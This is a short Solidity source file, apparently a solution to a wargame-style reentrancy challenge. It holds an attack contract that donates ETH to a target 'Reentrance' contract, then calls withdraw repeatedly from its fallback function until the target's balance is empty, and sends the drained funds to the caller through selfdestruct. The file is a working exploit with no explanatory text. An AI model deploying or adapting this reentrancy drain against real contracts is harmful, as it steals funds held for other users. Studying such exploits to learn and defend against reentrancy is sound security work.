pragma solidity ^0.4.18;

contract Reentrance {
    function donate(address _to) public payable;
    
    function withdraw(uint _amount) public;

    function() public payable {}
}


contract ExecuteRentry {
    Reentrance public reentry;
    uint withdrawValue = 0.01 ether;

    function ExecuteRentry (address _reentry) public payable {
        reentry = Reentrance(_reentry);
    }

    function execute() public payable {
        // Donate some ETH first
        reentry.donate.value(msg.value)(address(this));

        reentry.withdraw(withdrawValue);
    }

    function withdraw() public {
        // Get the monies!
        selfdestruct(msg.sender);
    }
    
    function () public payable {
        // Continue withdrawing during fallback
        if (address(reentry).balance > 0) {
            reentry.withdraw(withdrawValue);
        }
    }
}
